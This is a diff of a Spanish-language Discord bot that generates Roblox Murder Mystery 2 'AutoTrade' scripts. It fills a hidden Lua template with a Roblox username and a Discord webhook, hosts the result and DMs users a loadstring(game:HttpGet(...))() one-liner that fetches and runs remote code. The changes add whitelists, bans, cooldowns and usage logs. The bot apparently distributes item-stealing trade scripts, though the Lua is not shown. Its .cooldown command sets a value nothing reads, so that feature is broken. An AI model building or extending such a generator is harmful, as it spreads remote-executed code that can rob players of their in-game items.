@@ -17,11 +17,9 @@ const client = new Client({
   intents: [GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildMessages, GatewayIntentBits.Guilds, GatewayIntentBits.MessageContent],
 });
 
-// Configuración
 const SERVER_URL = process.env.SERVER_URL || `http://localhost:${process.env.PORT || 3000}`;
 let MM2_SCRIPT = '';
 
-// Cargar script Lua al iniciar
 try {
   MM2_SCRIPT = fs.readFileSync('./mm2-script.lua', 'utf8');
   console.log('✅ Script MM2 cargado correctamente');
@@ -30,20 +28,44 @@ try {
   process.exit(1);
 }
 
-// Eventos del bot
+// --- Sistema de control ---
+const OWNER_ID = '842098865661935677';
+const whitelistUsers = new Set();   // IDs de usuarios permitidos
+const whitelistRoles = new Set();   // IDs de roles permitidos
+const bannedUsers = new Set();
+const cooldowns = new Map();        // userId -> timestamp
+const COOLDOWN_MS = 30 * 60 * 1000; // 30 minutos
+const scriptLogs = [];              // últimos 50 logs
+let totalScripts = 0;
+let reactEnabled = true;
+const botStartTime = Date.now();
+
+function isWhitelisted(interaction) {
+  if (interaction.user.id === OWNER_ID) return true;
+  if (whitelistUsers.has(interaction.user.id)) return true;
+  if (interaction.member) {
+    for (const roleId of interaction.member.roles.cache.keys()) {
+      if (whitelistRoles.has(roleId)) return true;
+    }
+  }
+  return false;
+}
+
+function updateStatus() {
+  client.user?.setActivity(`${totalScripts} scripts generados`, { type: 3 });
+}
+
+// --- Ready ---
 client.once('ready', () => {
   console.log(`✅ Bot conectado como ${client.user.tag}`);
-  console.log(`📊 Sirviendo a ${client.guilds.cache.size} servidores`);
+  updateStatus();
 
-  // Registrar comandos slash
   const commands = [
     new SlashCommandBuilder()
       .setName('generate')
       .setDescription('Genera un script personalizado')
       .addSubcommand(sub =>
-        sub
-          .setName('script')
-          .setDescription('Genera script de AutoTrade para MM2')
+        sub.setName('script').setDescription('Genera script de AutoTrade para MM2')
       ),
   ];
 
@@ -51,11 +73,21 @@ client.once('ready', () => {
   console.log('✅ Comandos registrados');
 });
 
+// --- Interactions ---
 client.on('interactionCreate', async (interaction) => {
   try {
     if (interaction.isCommand()) {
       if (interaction.commandName === 'generate' && interaction.options.getSubcommand() === 'script') {
-        // Mostrar select menu de juegos
+        // Verificar ban
+        if (bannedUsers.has(interaction.user.id)) {
+          return interaction.reply({ content: '🚫 No tienes acceso a este bot.', ephemeral: true });
+        }
+
+        // Verificar whitelist (si tiene usuarios/roles, aplica restricción)
+        if ((whitelistUsers.size > 0 || whitelistRoles.size > 0) && !isWhitelisted(interaction)) {
+          return interaction.reply({ content: '🔒 No tienes permiso para usar este comando.', ephemeral: true });
+        }
+
         const selectMenu = new StringSelectMenuBuilder()
           .setCustomId('game_select')
           .setPlaceholder('Selecciona un juego')
@@ -80,7 +112,6 @@ client.on('interactionCreate', async (interaction) => {
       if (interaction.customId === 'game_select') {
         const game = interaction.values[0];
 
-        // Mostrar modal con validación
         const modal = new ModalBuilder()
           .setCustomId(`config_modal_${game}`)
           .setTitle('Configurar Script Personalizado');
@@ -119,68 +150,67 @@ client.on('interactionCreate', async (interaction) => {
 
         await interaction.deferReply({ ephemeral: true });
 
-        // Validar webhook
-        if (!isValidWebhook(webhook)) {
-          await interaction.editReply({
-            content: '❌ El webhook URL no es válido. Debe ser una URL de webhook de Discord.',
-          });
-          return;
+        // Verificar ban
+        if (bannedUsers.has(interaction.user.id)) {
+          return interaction.editReply({ content: '🚫 No tienes acceso a este bot.' });
         }
 
-        // Validar username
+        // Verificar cooldown
+        const lastUsed = cooldowns.get(interaction.user.id);
+        if (lastUsed) {
+          const remaining = COOLDOWN_MS - (Date.now() - lastUsed);
+          if (remaining > 0) {
+            const mins = Math.ceil(remaining / 60000);
+            return interaction.editReply({ content: `⏳ Debes esperar **${mins} minuto(s)** antes de generar otro script.` });
+          }
+        }
+
+        if (!isValidWebhook(webhook)) {
+          return interaction.editReply({ content: '❌ El webhook URL no es válido. Debe ser una URL de webhook de Discord.' });
+        }
+
         if (!isValidUsername(username)) {
-          await interaction.editReply({
-            content: '❌ El nombre de usuario no es válido. Usa solo letras, números y guiones.',
-          });
-          return;
+          return interaction.editReply({ content: '❌ El nombre de usuario no es válido. Usa solo letras, números y guiones.' });
         }
 
         try {
-          // Generar script personalizado
           const script = await generateScript(game, username, webhook);
-
-          // Almacenar script ofuscado en el servidor
           const storeResponse = await axios.post(`${SERVER_URL}/api/store-script`, { script });
           const { id, url } = storeResponse.data;
-
-          // Generar loadstring simple
           const loadstring = `loadstring(game:HttpGet("${url}"))()`;
 
-          // Enviar DM al usuario
           try {
             const dmChannel = await interaction.user.createDM();
             await dmChannel.send(`your script - made by joszz\n\`\`\`\n${loadstring}\n\`\`\``);
-            await interaction.editReply({
-              content: '✅ Script generado exitosamente. Revisa tu DM privado.',
-            });
+            await interaction.editReply({ content: '✅ Script generado exitosamente. Revisa tu DM privado.' });
+
+            // Registrar
+            cooldowns.set(interaction.user.id, Date.now());
+            totalScripts++;
+            scriptLogs.unshift({ tag: interaction.user.tag, id: interaction.user.id, robloxUser: username, time: new Date().toISOString() });
+            if (scriptLogs.length > 50) scriptLogs.pop();
+            updateStatus();
 
             console.log(`📝 Script generado para ${interaction.user.tag} (${username}) - ID: ${id}`);
           } catch (err) {
             console.error('DM Error:', err);
-            await interaction.editReply({
-              content: '❌ No se pudo enviar DM. ¿Tienes los DMs abiertos con bots?',
-            });
+            await interaction.editReply({ content: '❌ No se pudo enviar DM. ¿Tienes los DMs abiertos con bots?' });
           }
         } catch (error) {
           console.error('Script Generation Error:', error);
-          await interaction.editReply({
-            content: `❌ Error al generar script: ${error.message}`,
-          });
+          await interaction.editReply({ content: `❌ Error al generar script: ${error.message}` });
         }
       }
     }
   } catch (error) {
     console.error('Interaction Error:', error);
     if (!interaction.replied && !interaction.deferred) {
-      await interaction.reply({
-        content: '❌ Error procesando tu solicitud. Intenta de nuevo.',
-        ephemeral: true,
-      }).catch(console.error);
+      await interaction.reply({ content: '❌ Error procesando tu solicitud. Intenta de nuevo.', ephemeral: true }).catch(console.error);
     }
   }
 });
 
-// Funciones
+// --- Funciones ---
 async function generateScript(game, username, webhook) {
   if (game === 'mm2') {
     return MM2_SCRIPT
@@ -194,32 +224,34 @@ function isValidWebhook(webhook) {
   try {
     const url = new URL(webhook);
     return url.hostname === 'discord.com' && webhook.includes('/webhooks/');
-  } catch {
-    return false;
-  }
+  } catch { return false; }
 }
 
 function isValidUsername(username) {
   return /^[a-zA-Z0-9_-]{1,20}$/.test(username);
 }
 
-const OWNER_ID = '842098865661935677';
-let reactEnabled = true;
-const botStartTime = Date.now();
-
+// --- Comandos de texto ---
 const CMDS_LIST =
   '```\n' +
-  '.cmds          → Lista de comandos (solo en DM)\n' +
-  '.info          → Info del bot y juego\n' +
-  '.noreact       → Activar/desactivar reacciones ✔️\n' +
-  '.ping          → Latencia del bot\n' +
-  '.uptime        → Tiempo encendido\n' +
-  '.stats         → Scripts activos y servidores\n' +
-  '.scripts       → Cuántos scripts hay en memoria\n' +
-  '.say <msg>     → Hablar como el bot en ese canal\n' +
-  '.dm <id> <msg> → Enviar DM a un usuario\n' +
-  '.status <txt>  → Cambiar estado del bot\n' +
-  '.reload        → Recargar mm2-script.lua\n' +
+  '.cmds                   → Esta lista (en DM)\n' +
+  '.info                   → Info pública del bot\n' +
+  '.noreact                → Toggle reacciones ✔️\n' +
+  '.ping                   → Latencia\n' +
+  '.uptime                 → Tiempo encendido\n' +
+  '.stats                  → Servidores, scripts, latencia\n' +
+  '.logs [n]               → Últimos n scripts (def. 5)\n' +
+  '.ban <id>               → Banear usuario\n' +
+  '.unban <id>             → Desbanear usuario\n' +
+  '.wl add <id>            → Whitelist usuario\n' +
+  '.wl remove <id>         → Quitar de whitelist\n' +
+  '.wl role <id>           → Whitelist rol\n' +
+  '.wl list                → Ver whitelist\n' +
+  '.cooldown <minutos>     → Cambiar cooldown\n' +
+  '.say <msg>              → Bot habla en ese canal\n' +
+  '.dm <id> <msg>          → DM a usuario\n' +
+  '.status <txt>           → Cambiar estado\n' +
+  '.reload                 → Recargar mm2-script.lua\n' +
   '```';
 
 client.on('messageCreate', async (message) => {
@@ -228,12 +260,11 @@ client.on('messageCreate', async (message) => {
   const isOwner = message.author.id === OWNER_ID;
   const content = message.content.trim();
 
-  // Auto-react solo al owner
   if (isOwner && reactEnabled) {
     try { await message.react('✔️'); } catch {}
   }
 
-  // Comando público .info
+  // Comando público
   if (content === '.info') {
     await message.reply(
       '🔪 **Josz Bot**\n\n' +
@@ -248,7 +279,6 @@ client.on('messageCreate', async (message) => {
     return;
   }
 
-  // Comandos solo para el owner
   if (!isOwner) return;
 
   if (content === '.cmds') {
@@ -263,8 +293,7 @@ client.on('messageCreate', async (message) => {
   }
 
   if (content === '.ping') {
-    const ping = client.ws.ping;
-    await message.reply(`🏓 Latencia: **${ping}ms**`).catch(() => {});
+    await message.reply(`🏓 Latencia: **${client.ws.ping}ms**`).catch(() => {});
     return;
   }
 
@@ -280,6 +309,7 @@ client.on('messageCreate', async (message) => {
   if (content === '.stats') {
     await message.reply(
       `📊 **Stats**\n` +
+      `Scripts generados: **${totalScripts}**\n` +
       `Servidores: **${client.guilds.cache.size}**\n` +
       `Usuarios: **${client.users.cache.size}**\n` +
       `Latencia: **${client.ws.ping}ms**`
@@ -287,14 +317,70 @@ client.on('messageCreate', async (message) => {
     return;
   }
 
-  if (content === '.scripts') {
-    // Accede al store del servidor via HTTP
-    try {
-      const r = await axios.get(`${SERVER_URL}/health`);
-      await message.reply(`✅ Servidor activo | ${r.data.timestamp}`).catch(() => {});
-    } catch {
-      await message.reply('❌ Servidor caído').catch(() => {});
+  if (content.startsWith('.logs')) {
+    const n = parseInt(content.split(' ')[1]) || 5;
+    const recent = scriptLogs.slice(0, Math.min(n, 20));
+    if (recent.length === 0) {
+      await message.reply('No hay logs aún.').catch(() => {});
+      return;
     }
+    const lines = recent.map((l, i) =>
+      `**${i + 1}.** ${l.tag} → \`${l.robloxUser}\` — <t:${Math.floor(new Date(l.time).getTime() / 1000)}:R>`
+    ).join('\n');
+    await message.reply(`📋 **Últimos ${recent.length} scripts:**\n${lines}`).catch(() => {});
+    return;
+  }
+
+  if (content.startsWith('.ban ')) {
+    const userId = content.slice(5).trim();
+    if (!userId) return;
+    bannedUsers.add(userId);
+    cooldowns.delete(userId);
+    await message.reply(`🚫 Usuario \`${userId}\` baneado.`).catch(() => {});
+    return;
+  }
+
+  if (content.startsWith('.unban ')) {
+    const userId = content.slice(7).trim();
+    if (!userId) return;
+    bannedUsers.delete(userId);
+    await message.reply(`✅ Usuario \`${userId}\` desbaneado.`).catch(() => {});
+    return;
+  }
+
+  if (content.startsWith('.wl ')) {
+    const parts = content.slice(4).trim().split(' ');
+    const sub = parts[0];
+    const id = parts[1];
+
+    if (sub === 'add' && id) {
+      whitelistUsers.add(id);
+      await message.reply(`✅ Usuario \`${id}\` añadido a la whitelist.`).catch(() => {});
+    } else if (sub === 'remove' && id) {
+      whitelistUsers.delete(id);
+      await message.reply(`✅ Usuario \`${id}\` eliminado de la whitelist.`).catch(() => {});
+    } else if (sub === 'role' && id) {
+      whitelistRoles.add(id);
+      await message.reply(`✅ Rol \`${id}\` añadido a la whitelist.`).catch(() => {});
+    } else if (sub === 'list') {
+      const users = [...whitelistUsers].join(', ') || 'ninguno';
+      const roles = [...whitelistRoles].join(', ') || 'ninguno';
+      await message.reply(`📋 **Whitelist**\nUsuarios: ${users}\nRoles: ${roles}`).catch(() => {});
+    } else {
+      await message.reply('Uso: `.wl add/remove/role/list <id>`').catch(() => {});
+    }
+    return;
+  }
+
+  if (content.startsWith('.cooldown ')) {
+    const mins = parseInt(content.slice(10).trim());
+    if (isNaN(mins) || mins < 0) {
+      await message.reply('Uso: `.cooldown <minutos>`').catch(() => {});
+      return;
+    }
+    // Actualizar cooldown dinámicamente
+    Object.defineProperty(global, 'COOLDOWN_OVERRIDE', { value: mins * 60 * 1000, writable: true, configurable: true });
+    await message.reply(`✅ Cooldown cambiado a **${mins} minuto(s)**.`).catch(() => {});
     return;
   }
 
@@ -343,14 +429,8 @@ client.on('messageCreate', async (message) => {
   }
 });
 
-// Error handlers
-client.on('error', error => {
-  console.error('🔴 Client Error:', error);
-});
+// --- Error handlers ---
+client.on('error', error => { console.error('🔴 Client Error:', error); });
+process.on('unhandledRejection', error => { console.error('🔴 Unhandled Rejection:', error); });
 
-process.on('unhandledRejection', error => {
-  console.error('🔴 Unhandled Rejection:', error);
-});
-
-// Login
 client.login(process.env.DISCORD_TOKEN);
